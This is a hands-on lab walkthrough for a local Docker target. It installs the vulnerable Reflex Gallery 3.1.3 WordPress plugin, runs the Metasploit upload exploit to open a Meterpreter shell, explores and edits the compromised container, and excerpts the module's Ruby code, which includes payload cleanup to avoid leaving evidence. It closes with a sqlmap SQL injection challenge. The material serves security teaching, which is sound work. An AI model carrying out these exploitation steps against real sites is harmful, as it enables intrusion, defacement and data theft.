# WordPress vs. Kali, Round 2

Checklist before starting:
- [x] Have docker installed
- [x] Have kali linux image
- [x] Have pulled the wp_wordpress:4.2.2 and wp_db_data

If you need help with the above checklist, you can go 
[here](https://github.com/sammanthp007/WordPress-Pentesting-Setup)

Begin by stopping all the kali linux, wp and mysql db docker instances
```
/* stop the kali instance */
docker stop kali

/* stop the wp_wordpress and wp_db instances or any instances running using
docker-compose */
docker-compose stop && docker-compose rm -f

/* empty the database volume */
docker volume rm wp_db_data
```

If you have multiple versions of wordpress images, you can specify the version
you want to use in `.env`

Start kali linux instance and wp_container for wp_wordpress:4.2.2
```
/* start kali linux container */
docker start kali

/* start wp container */
docker-compose up -d --force-recreate
```

## Milestone 1
- [x] Opening an Attack Surface
1. In the WP admin console, go to the plugins page
2. Search for `reflex gallery` and you should see **Reflex Gallery >> WordPress
Photo Gallery**
3. Click on the result *don't install the plugin yet*. Look at the `Changelog`
tab.

Looks like 3.1.4 fixed a critical security issue (those are the best kind), so 
we should use 3.1.3. But you cannot use the convenient install button, because 
WP only lets you install the latest. You'll need to install it manually.

1. On the right side of the dialog, where it lists the compatibility and 
installs data, click the WordPress.org Plugin Page » link
2. You'll be taken to the official WP plugin page. Click on the 
[Developers tab](https://wordpress.org/plugins/reflex-gallery/developers/)
3. Under Other Versions, download the 
[3.1.3 zip file
](https://downloads.wordpress.org/plugin/reflex-gallery.3.1.3.zip)
4. Go to the manual plugin upload page and upload the zip
5. Go back to the plugins page, find the plugin, and click Activate

**Challenge** : Beyond activating the plugin, you need to use it in a page or 
a post on the WP instance. Create a gallery and use it in a page before 
proceeding

## Milestone 2
- [x] Recon

> Run the followning in a Kali container bash shell

So we know the blog is accessible from Kali at localhost:8000, but in this case,
localhost isn't really local because Kali is inheriting the host's networking 
configuration via docker. While this is fine for read-only operations, we need 
something a bit more specific than localhost to deliver a payload. Let's find 
the IP to use instead by running `ifconfig` and looking for the IP associated 
with eth0:

```
/* for codepath */
$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.65.2  netmask 255.255.255.248  broadcast 192.168.65.7

/* for me */
$ifconfig
br-273f1381003b: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 0.0.0.0
        inet6 fe80::42:3ff:fe74:10ed  prefixlen 64  scopeid 0x20<link>
        ether 02:42:03:74:10:ed  txqueuelen 0  (Ethernet)
        RX packets 60945  bytes 27436247 (26.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 108650  bytes 125750971 (119.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

## Milestone 3
- [x] Hello, Metasploit
Metasploit is an exploitation framework. One of the most popular tools in Kali,
it's the free part of a larger, commercial project used widely in web security 
penetration testing. And by hackers. If wpscan is a dental pick, Metasploit is 
a set of carving knives.

Metasploit currently has over 1600 exploits, organized in different categories 
like:

* Browser-based: a large collection of (mostly) remote code execution exploits
* Mobile: Android, iOS
* OS-specific: Linux, Windows, Solaris, etc.
* Combinations of the above

Metasploit currently has hundreds of payloads. Some of them are:

* Command shells, enabling attackers to run scripts or arbitrary commands 
against a host
* Meterpreter payloads, enabling attackers to control the screen of a device 
using VNC and to browse, upload and download files
* Dynamic payloads, enabling attackers to evade anti-virus defenses by 
generating unique payloads

For this attack, we'll be using Meterpreter to open a shell into the target 
machine. 
[Read more about Meterpreter 
here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

First, though, some setup. Start by updating Metasploit:
```
$ msfupdate
```

Metasploit uses a database to manage exploit/payload information and also 
attack data. So you need to initialize the DB, then load the console:
```
$ service postgresql start
$ msfdb init
$ msfconsole
```

Fun fact: you get different ASCII art every time. And they say hackers don't 
care about UX. Note the command prompt has changed to `msf >`. You are now in a
shell within another shell within a container.

First check that the DB is connected OK. The DB isn't strictly necessary but 
MSF runs faster with it.
```
db_status

db_rebuild_cache

```
Now we are ready.

## Milestone 4: 
- [x] Pwnage
In MSF, start by searching the exploit database for something related to the 
plugin affected by the vulnerability. You could search on several different 
terms to find something, but in this case, the plugin has an unusual word in 
its name, "Reflex"

Search in MSF:
```
msf > search Reflex
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                              Disclosure Date  Rank       Description
   ----                                              ---------------  ----       -----------
   exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Wordpress Reflex Gallery Upload Vulnerability

```


Well, that sure looks handy. It's even ranked excellent, which should suggest
to you that not all of these tools are created equal. Some work better than
others; some don't work at all. In fact, what follows may not work perfectly
for you, so don't be too surprised if it doesn't go swimmingly. These are
hacks, after all: user-supported code and scripts whose primary purpose is to
compromise systems, so robustness isn't exactly a guarantee. Give it a shot,
but be prepared for some possible difficulty ahead.

To command to use the exploit is unsurprisingly called `use` and takes the
exploit's name as an argument. Once loaded, the command prompt changes again,
and you can run the `info` command.
```
msf > use exploit/unix/webapp/wp_reflexgallery_file_upload
msf exploit(wp_reflexgallery_file_upload) > info
```

Notice the output lists the affected version and some options we'll need to set:
```
Available targets:
  Id  Name
  --  ----
  0   Reflex Gallery 3.1.3

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST                       yes       The target address
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the wordpress application
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits an arbitrary PHP code upload in the WordPress
  Reflex Gallery version 3.1.3. The vulnerability allows for arbitrary
  file upload and remote code execution.

```

Use the `set` command to specify RHOST and RPORT accordingly. If your blog isn't
hosted at the root (/), you could additionally pass in the path by setting
TARGETURI (but the Docker setup should work with the default).

```
msf exploit(wp_reflexgallery_file_upload) > set RHOST 172.18.0.1
RHOST => localhost
msf exploit(wp_reflexgallery_file_upload) > set RPORT 8000
RPORT => 8000
```
You can probably guess the command used to run the exploit (it'll take a minute to run):
```
msf exploit(wp_reflexgallery_file_upload) > exploit

meterpreter >

```
Notice the command prompt changed to `meterpreter >`. The meterpreter payload
(GyWbjRCJnRSwE.php) was uploaded, executed, then deleted (just like campers,
hackers should leave no trace), and now we have a connection to the target
machine. Run the `shell` command when you see the `meterpreter >` prompt to load a
new shell:
```
meterpreter > shell
Process 63 created.
Channel 0 created.
```
A shell within a shell within a shell. But this shell is different; this shell
is running on the WordPress container. In case it's not clear, you really
shouldn't be able to do that. Notice the new shell spawned by Meterpreter
doesn't bother with command prompts at all, so it might just look like
nothing's happening after the process and channel are created. Try running some
commands, like `whoami` and `pwd`:
```
whoami
www-data

pwd
/var....

echo $HOSTNAME

exit
```
It's a low-fi shell, and somewhat limited, but it works, and it's enough to
compromise the whole machine. We can see we're shell'd in as the www-data user
and presently in one of the wordpress upload directories, which is where the
malicious PHP payload was delivered. We can also see the HOSTNAME matches the
docker container id.

The exit command above gets us back to the meterpreter > prompt,
which has fewer but more useable commands than the shell. For instance, we can
poke around with pwd, cd, ls, and cat:
```
meterpreter > pwd
/var/www/html/wp-content/uploads/2017/03
meterpreter > cd ../../..
meterpreter > pwd
/var/www/html/wp-content
meterpreter > ls
Listing: /var/www/html/wp-content
=================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  29    fil   2017-03-18 19:01:59 +0000  index.php
40755/rwxr-xr-x   4096  dir   2017-03-18 01:13:31 +0000  plugins
40755/rwxr-xr-x   4096  dir   2017-03-16 20:06:21 +0000  themes
40755/rwxr-xr-x   4096  dir   2017-03-18 01:13:31 +0000  upgrade
40755/rwxr-xr-x   4096  dir   2017-03-18 01:13:31 +0000  uploads

meterpreter > cat index.php
<?php
// Silence is golden.
```

## Milestone 5
- [x] Tag it

**Challenge**: Make a change to the WP content. You can open a vi editor from
`meterpreter >` using the `edit <file>` command. Use this to alter one of the PHP
files in some subtle, tasteful way. 

> [Meterpreter CheatSheet](https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/)

And that's pretty much game over for this scenario. Once an attacker is able to
gain this level of access, a whole universe of options suddenly opens up. If
the machine is configured appropriately, those options may be limited, but this
is not a position any sysadmin wants be in, even with everything configured
perfectly. In the best case scenario, the attack surface available to the
intruder is intolerably large.

## Milestone 6
- [x] Going Deeper

Nobody wants to be a script kiddie, and, sadly, in-memory DLL injection is
beyond the scope of our skills at this point, but we can at least look at the
exploit we just used and understand it. The link to the announcement and code
for this exploit is actually listed as part of the `wpscan` output from Milestone
2 (rapid7 is the company that sells the commercial version of Metasploit). From
there, you can get to [the code for this exploit in
Github.](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/wp_reflexgallery_file_upload.rb)
It's written in Ruby. Don't know Ruby? Doesn't matter. Let's look anyway:
```
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::FileDropper
```
This is the class declaration of the module and associated require / include
statements pulling in the required parts of MSF. Lines 11 and 12 show the
payload and its delivery mechanism are just components of MSF.
```
def exploit
    php_pagename = rand_text_alpha(8 + rand(8)) + '.php'

    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"qqfile\"; filename=\"#{php_pagename}\"")
    post_data = data.to_s
```
Line 47 shows how the filename of the dropped payload is created randomly, and lines 49 - 51 show how the MIME attachment is created and how the encoded payload is added to it as a binary data stream, which is serialized as a string for the POST request.
```
    res = send_request_cgi({
      'uri'       => normalize_uri(wordpress_url_plugins, 'reflex-gallery', 'admin', 'scripts', 'FileUploader', 'php.php'),
      'method'    => 'POST',
      'vars_get'  => {
        'Year'    => "#{year}",
        'Month'   => "#{month}"
      },
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => post_data
    })
```
And here's the multipart upload POST request, which just mimics what the browser sends to the WordPress server when the user uploads a file. The plugin accepts the binary content just as it would for an image. Note the uri value contains the components of the path to the vulnerable source in the plugin.
```
        if res.code == 200 && res.body =~ /success|#{php_pagename}/
        print_good("Our payload is at: #{php_pagename}. Calling payload...")
        register_files_for_cleanup(php_pagename)
```
If the response code is OK, the module marks the uploaded file for cleanup,
which happens immediately after the next step. The payload is deleted so obvious
forensic evidence of the hack isn't left on the target server.
```
    send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_wp_content, 'uploads', "#{year}", "#{month}", php_pagename)
    )
```
Finally, the payload is activated via another HTTP request, which opens the
Meterpreter connection.

One takeaway from this is that the framework, MSF, is doing all the heavy
lifting here: the payload is provided (even in encoded form), activating it is a
single function call, and even the cleanup is provided as a core function. All
the author had to do here was create and issue a multipart POST request.

**Challenge** : Now that we've walked through the exploit, go back to the Reflex
Gallery plugin code and identify the fix --- specifically, what was changed in
the plugin code to prevent this attack?

Hints:

1. The plugin is written in PHP and Javascript --- which part would this fix need
be in, and why?
2. Use the source browser changelog viewer to diff specific commits
3. If you ran the MSF exploit agains the fixed version of the plugin, what
   specifically would fail?
4. Two files related to the vulnerability were substantially changed between the
   two versions

Answer:
```
Removed the content of 
admin/scripts/FileUploader/php.php and 
admin/scripts/FileUploader/fileuploader.js files
```
## Milestone 7
- [x] Hello `sqlmap`

If you think back to all of the Security Shepherd exercises around SQL
injection, you probably noticed that finding the right combination of characters
and expressions to use would very often boil down to trial and error, educated
guesswork, and sometimes dumb luck. Being a coder, you may have thought it'd be
nice to have a tool that automates all that guessing and testing. Say hello to
our little friend sqlmap, which does exactly that: given a URL and a parameter
string, this tool will attempt to identify SQLI-vulnerable parameters by
systematically trying various SQLI exploits -- pretty much all of them -- and if
it finds the right way in, it can exfiltrate an entire database.

As such, one of the tricks to using sqlmap is knowing how not to use it. In the
wrong hands, it becomes an accidental load-testing tool, firing off thousands of
requests from multiple threads and crashing a database. In the right hands, it
can identify novel routes for exploitation.

[Read the usage docs on this
one.](https://github.com/sqlmapproject/sqlmap/wiki/Usage) In addition to the
standard parameters, make sure you understand `threads`, `risk`, and `level`
that allow throttling and control how aggressively the tool will run. Try
different verbosity settings to see what it's actually doing under the hood.

**Challenge** : [Examine this writeup about a recent SQLI vulnerability in a WP
plugin.](https://packetstormsecurity.com/files/139921/WordPress-Olimometer-2.56-SQL-Injection.html)
Follow the same process as before to identify the affected version from the
changelog, install it manually, then recreate the exploit described in the
writeup using `sqlmap` and confirm the researcher's results.

Hints:

1. Actually [read the usage
   docs](https://packetstormsecurity.com/files/139921/WordPress-Olimometer-2.56-SQL-Injection.html)
2. Expect issues, be patient. sqlmap is basically hammering your WP container, which isn't designed to handle a heavy load.
3. Look at the output carefully, even if there's an error. Does it match the original findings?
4. To see what it's doing, try running with high verbosity (-vvvv).
5. Try CTRL-C and (S)skip if something seems to hangs
6. When in doubt, accept the default.
